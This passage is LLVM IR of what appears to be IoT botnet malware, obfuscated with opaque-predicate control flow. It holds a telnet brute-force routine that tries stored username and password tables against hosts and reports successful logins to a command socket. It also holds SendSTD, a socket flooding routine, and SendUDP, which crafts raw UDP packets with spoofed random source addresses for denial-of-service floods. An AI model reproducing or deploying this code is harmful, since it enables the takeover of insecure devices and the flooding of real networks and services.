  %1717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1716
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1717, i32 0, i32 9
  %1719 = load i8*, i8** %1718, align 8
  %1720 = call i32 @contains_success(i8* %1719)
  %1721 = icmp ne i32 %1720, 0
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %1063
  %1722 = load i32, i32* @mainCommSock, align 4
  %1723 = load i32, i32* %14, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1724
  %1726 = call i8* @get_telstate_host(%struct.telstate_t* %1725)
  %1727 = load i32, i32* %14, align 4
  %1728 = sext i32 %1727 to i64
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1728
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1729, i32 0, i32 4
  %1731 = load i8, i8* %1730, align 2
  %1732 = zext i8 %1731 to i64
  %1733 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1732
  %1734 = load i8*, i8** %1733, align 8
  %1735 = load i32, i32* %14, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1736
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1737, i32 0, i32 5
  %1739 = load i8, i8* %1738, align 1
  %1740 = zext i8 %1739 to i64
  %1741 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1740
  %1742 = load i8*, i8** %1741, align 8
  %1743 = call i32 (i32, i8*, ...) @sockprintf(i32 %1722, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0), i8* %1726, i8* %1734, i8* %1742)
  %1744 = load i32, i32* %14, align 4
  %1745 = sext i32 %1744 to i64
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1745
  call void @advance_telstate(%struct.telstate_t* %1746, i32 7)
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %1105
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %1122
  %1747 = load i32, i32* %14, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1748
  call void @reset_telstate(%struct.telstate_t* %1749)
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1143
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1170
  %1750 = load i32, i32* %14, align 4
  %1751 = sext i32 %1750 to i64
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1751
  call void @reset_telstate(%struct.telstate_t* %1752)
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %1235
  %1753 = call i64 @time(i64* null) #5
  %1754 = trunc i64 %1753 to i32
  %1755 = load i32, i32* %14, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1756
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1757, i32 0, i32 7
  store i32 %1754, i32* %1758, align 16
  %1759 = load i32, i32* %14, align 4
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1760
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1761, i32 0, i32 0
  %1763 = load i32, i32* %1762, align 16
  %1764 = call i64 @send(i32 %1763, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0), i64 4, i32 16384)
  %1765 = icmp slt i64 %1764, 0
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %1290
  %1766 = load i32, i32* @mainCommSock, align 4
  %1767 = load i32, i32* %14, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1768
  %1770 = call i8* @get_telstate_host(%struct.telstate_t* %1769)
  %1771 = load i32, i32* %14, align 4
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 4
  %1775 = load i8, i8* %1774, align 2
  %1776 = zext i8 %1775 to i64
  %1777 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1776
  %1778 = load i8*, i8** %1777, align 8
  %1779 = load i32, i32* %14, align 4
  %1780 = sext i32 %1779 to i64
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1780
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1781, i32 0, i32 5
  %1783 = load i8, i8* %1782, align 1
  %1784 = zext i8 %1783 to i64
  %1785 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1784
  %1786 = load i8*, i8** %1785, align 8
  %1787 = call i32 (i32, i8*, ...) @sockprintf(i32 %1766, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i32 0, i32 0), i8* %1770, i8* %1778, i8* %1786)
  %1788 = load i32, i32* %14, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 0
  %1792 = load i32, i32* %1791, align 16
  %1793 = load i32, i32* %11, align 4
  %1794 = load i32, i32* %14, align 4
  %1795 = sext i32 %1794 to i64
  %1796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1795
  %1797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1796, i32 0, i32 9
  %1798 = load i8*, i8** %1797, align 8
  %1799 = call i32 @read_until_response(i32 %1792, i32 %1793, i8* %1798, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %1800 = icmp ne i32 %1799, 0
  br label %originalBB169

originalBB173alteredBB:                           ; preds = %originalBB173, %1342
  %1801 = load i32, i32* %14, align 4
  %1802 = sext i32 %1801 to i64
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 9
  %1805 = load i8*, i8** %1804, align 8
  %1806 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1805, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i32 0, i32 0))
  %1807 = icmp ne i32 %1806, 0
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1366
  %1808 = load i32, i32* %14, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1809
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1810, i32 0, i32 3
  %1812 = load i8, i8* %1811, align 1
  %1813 = zext i8 %1812 to i32
  %1814 = icmp ne i32 %1813, 3
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1390
  %1815 = load i32, i32* @mainCommSock, align 4
  %1816 = load i32, i32* %14, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1817
  %1819 = call i8* @get_telstate_host(%struct.telstate_t* %1818)
  %1820 = load i32, i32* %14, align 4
  %1821 = sext i32 %1820 to i64
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1821
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1822, i32 0, i32 4
  %1824 = load i8, i8* %1823, align 2
  %1825 = zext i8 %1824 to i64
  %1826 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1825
  %1827 = load i8*, i8** %1826, align 8
  %1828 = load i32, i32* %14, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 5
  %1832 = load i8, i8* %1831, align 1
  %1833 = zext i8 %1832 to i64
  %1834 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1833
  %1835 = load i8*, i8** %1834, align 8
  %1836 = call i32 (i32, i8*, ...) @sockprintf(i32 %1815, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i32 0, i32 0), i8* %1819, i8* %1827, i8* %1835)
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1440
  %1837 = load i32, i32* %14, align 4
  %1838 = sext i32 %1837 to i64
  %1839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1838
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1839, i32 0, i32 3
  %1841 = load i8, i8* %1840, align 1
  %1842 = zext i8 %1841 to i32
  %1843 = icmp ne i32 %1842, 3
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %1492
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %1512
  br label %originalBB193
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @RemoveTempDirs(...) #1

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %80, %3
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %80

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* @x.71
  %49 = load i32, i32* @y.72
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %47
  %56 = load i32, i32* %7, align 4
  %57 = load i8*, i8** %13, align 8
  %58 = call i64 @send(i32 %56, i8* %57, i64 75, i32 0)
  %59 = load i32, i32* %7, align 4
  %60 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %61 = call i32 @connect(i32 %59, %struct.sockaddr* %60, i32 16)
  %62 = call i64 @time(i64* null) #5
  %63 = load i64, i64* %8, align 8
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %66 = add nsw i64 %63, %65
  %67 = icmp sge i64 %62, %66
  %68 = load i32, i32* @x.71
  %69 = load i32, i32* @y.72
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %67, label %76, label %79

; <label>:76:                                     ; preds = %originalBBpart2
  %77 = load i32, i32* %7, align 4
  %78 = call i32 @close(i32 %77)
  call void @_exit(i32 0) #11
  unreachable

; <label>:79:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %80

; <label>:80:                                     ; preds = %79, %38
  %81 = load i32, i32* %11, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %47
  %84 = load i32, i32* %7, align 4
  %85 = load i8*, i8** %13, align 8
  %86 = call i64 @send(i32 %84, i8* %85, i64 75, i32 0)
  %87 = load i32, i32* %7, align 4
  %88 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 16)
  %90 = call i64 @time(i64* null) #5
  %91 = load i64, i64* %8, align 8
  %92 = load i32, i32* %6, align 4
  %93 = sext i32 %92 to i64
  %_ = shl i64 %91, %93
  %_1 = sub i64 0, %91
  %gen = add i64 %_1, %93
  %_2 = shl i64 %91, %93
  %_3 = sub i64 0, %91
  %gen4 = add i64 %_3, %93
  %_5 = shl i64 %91, %93
  %94 = add nsw i64 %91, %93
  %95 = icmp sge i64 %90, %94
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i32, i32* @x.73
  %38 = load i32, i32* @y.74
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i8*, i8** %7, align 8
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %47 = call i32 @getHost(i8* %45, %struct.in_addr* %46)
  %48 = icmp ne i32 %47, 0
  %49 = load i32, i32* @x.73
  %50 = load i32, i32* @y.74
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %57, label %74

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* @x.73
  %59 = load i32, i32* @y.74
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* @x.73
  %67 = load i32, i32* @y.74
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %382

; <label>:74:                                     ; preds = %originalBBpart2
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %76 = getelementptr inbounds [8 x i8], [8 x i8]* %75, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %76, i8 0, i64 8, i32 4, i1 false)
  %77 = load i32, i32* %11, align 4
  store i32 %77, i32* %14, align 4
  %78 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %78, i32* %15, align 4
  %79 = load i32, i32* %15, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %82, label %81

; <label>:81:                                     ; preds = %74
  br label %382

; <label>:82:                                     ; preds = %74
  %83 = load i32, i32* @x.73
  %84 = load i32, i32* @y.74
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  store i32 1, i32* %16, align 4
  %91 = load i32, i32* %15, align 4
  %92 = bitcast i32* %16 to i8*
  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #5
  %94 = icmp slt i32 %93, 0
  %95 = load i32, i32* @x.73
  %96 = load i32, i32* @y.74
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %94, label %103, label %120

; <label>:103:                                    ; preds = %originalBBpart28
  %104 = load i32, i32* @x.73
  %105 = load i32, i32* @y.74
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %103
  %112 = load i32, i32* @x.73
  %113 = load i32, i32* @y.74
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %382

; <label>:120:                                    ; preds = %originalBBpart28
  %121 = load i32, i32* @x.73
  %122 = load i32, i32* @y.74
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  store i32 50, i32* %17, align 4
  %129 = load i32, i32* @x.73
  %130 = load i32, i32* @y.74
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %137

; <label>:137:                                    ; preds = %originalBBpart227, %originalBBpart216
  %138 = load i32, i32* %17, align 4
  %139 = add nsw i32 %138, -1
  store i32 %139, i32* %17, align 4
  %140 = icmp ne i32 %138, 0
  br i1 %140, label %141, label %164

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @x.73
  %143 = load i32, i32* @y.74
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %150 = call i64 @time(i64* null) #5
  %151 = call i32 @rand_cmwc()
  %152 = zext i32 %151 to i64
  %153 = xor i64 %150, %152
  %154 = trunc i64 %153 to i32
  call void @srand(i32 %154) #5
  %155 = call i32 @rand() #5
  call void @init_rand(i32 %155)
  %156 = load i32, i32* @x.73
  %157 = load i32, i32* @y.74
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %137

; <label>:164:                                    ; preds = %137
  %165 = load i32, i32* %12, align 4
  %166 = sub nsw i32 32, %165
  %167 = shl i32 1, %166
  %168 = sub nsw i32 %167, 1
  %169 = xor i32 %168, -1
  store i32 %169, i32* %18, align 4
  %170 = load i32, i32* %10, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 28, %171
  %173 = call i8* @llvm.stacksave()
  store i8* %173, i8** %19, align 8
  %174 = alloca i8, i64 %172, align 16
  %175 = bitcast i8* %174 to %struct.iphdr*
  store %struct.iphdr* %175, %struct.iphdr** %20, align 8
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = getelementptr i8, i8* %177, i64 20
  %179 = bitcast i8* %178 to %struct.udphdr*
  store %struct.udphdr* %179, %struct.udphdr** %21, align 8
  %180 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 4
  %184 = load i32, i32* %18, align 4
  %185 = call i32 @getRandomIP(i32 %184)
  %186 = call i32 @htonl(i32 %185) #10
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = add i64 8, %188
  %190 = trunc i64 %189 to i32
  call void @makeIPPacket(%struct.iphdr* %180, i32 %183, i32 %186, i8 zeroext 17, i32 %190)
  %191 = load i32, i32* %10, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 8, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #10
  %196 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.1* %197 to %struct.anon.2*
  %199 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %198, i32 0, i32 2
  store i16 %195, i16* %199, align 2
  %200 = call i32 @rand_cmwc()
  %201 = trunc i32 %200 to i16
  %202 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.1* %203 to %struct.anon.2*
  %205 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %204, i32 0, i32 0
  store i16 %201, i16* %205, align 2
  %206 = load i32, i32* %8, align 4
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %226

; <label>:208:                                    ; preds = %164
  %209 = load i32, i32* @x.73
  %210 = load i32, i32* @y.74
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %208
  %217 = call i32 @rand_cmwc()
  %218 = load i32, i32* @x.73
  %219 = load i32, i32* @y.74
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %247

; <label>:226:                                    ; preds = %164
  %227 = load i32, i32* @x.73
  %228 = load i32, i32* @y.74
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %226
  %235 = load i32, i32* %8, align 4
  %236 = trunc i32 %235 to i16
  %237 = call zeroext i16 @htons(i16 zeroext %236) #10
  %238 = zext i16 %237 to i32
  %239 = load i32, i32* @x.73
  %240 = load i32, i32* @y.74
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %247

; <label>:247:                                    ; preds = %originalBBpart235, %originalBBpart231
  %248 = phi i32 [ %217, %originalBBpart231 ], [ %238, %originalBBpart235 ]
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.1* %251 to %struct.anon.2*
  %253 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %252, i32 0, i32 1
  store i16 %249, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.1* %255 to %struct.anon.2*
  %257 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %256, i32 0, i32 3
  store i16 0, i16* %257, align 2
  %258 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %259 = bitcast %struct.udphdr* %258 to i8*
  %260 = getelementptr inbounds i8, i8* %259, i64 8
  %261 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %260, i32 %261)
  %262 = bitcast i8* %174 to i16*
  %263 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 2
  %265 = load i16, i16* %264, align 2
  %266 = zext i16 %265 to i32
  %267 = call zeroext i16 @csum(i16* %262, i32 %266)
